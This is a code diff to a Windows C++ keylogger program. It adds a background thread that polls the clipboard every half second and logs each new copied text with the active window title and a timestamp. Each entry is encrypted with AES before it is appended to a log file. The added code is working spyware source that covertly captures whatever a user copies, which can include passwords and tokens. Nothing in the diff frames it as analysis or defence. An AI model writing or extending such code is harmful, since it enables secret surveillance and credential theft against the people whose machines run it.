@@ -9,6 +9,10 @@
 #include <windows.h>
 #include "keylabels.cpp"
 #include "logsEncryption.hpp"
+#include <thread>
+#include <chrono>
+#include <mutex>
+#include "logger_utils.hpp" // for extern std::mutex log_mutex
 
 const Config* g_config_ptr = nullptr;
 
@@ -34,6 +38,51 @@ void Keylogger::RemoveHook() {
     if (hookHandle) {
         UnhookWindowsHookEx(hookHandle);
         hookHandle = nullptr;
+    }
+}
+
+void Keylogger::RunClipboardMonitor(const Config* config) {
+    ClipboardMonitorThread(config);
+}
+
+void Keylogger::ClipboardMonitorThread(const Config* config) {
+    std::string lastClipboard;
+    while (true) {
+        if (OpenClipboard(nullptr)) {
+            HANDLE hData = GetClipboardData(CF_TEXT);
+            if (hData) {
+                char* pszText = static_cast<char*>(GlobalLock(hData));
+                if (pszText) {
+                    std::string clipboardText(pszText);
+                    GlobalUnlock(hData);
+                    if (!clipboardText.empty() && clipboardText != lastClipboard) {
+                        lastClipboard = clipboardText;
+                        HWND activeWindow = GetForegroundWindow();
+                        char windowTitle[256] = "Unknown";
+                        if (activeWindow) {
+                            GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
+                        }
+                        time_t t = time(nullptr);
+                        struct tm timeInfo;
+                        localtime_s(&timeInfo, &t);
+                        char timeStr[64];
+                        strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S", &timeInfo);
+                        nlohmann::json logEntry = {
+                            {"timestamp", std::string(timeStr)},
+                            {"key", std::string("%ClipBoardText%"+clipboardText)},
+                            {"window", std::string(windowTitle)}
+                        };
+                        std::lock_guard<std::mutex> lock(log_mutex);
+                        std::ofstream logFile(config->log_file_name, std::ios_base::app);
+                        std::string encryptedLog = encryptAES_CBC(logEntry.dump());
+                        logFile << encryptedLog << "\n";
+                        logFile.flush();
+                    }
+                }
+            }
+            CloseClipboard();
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
 }
 
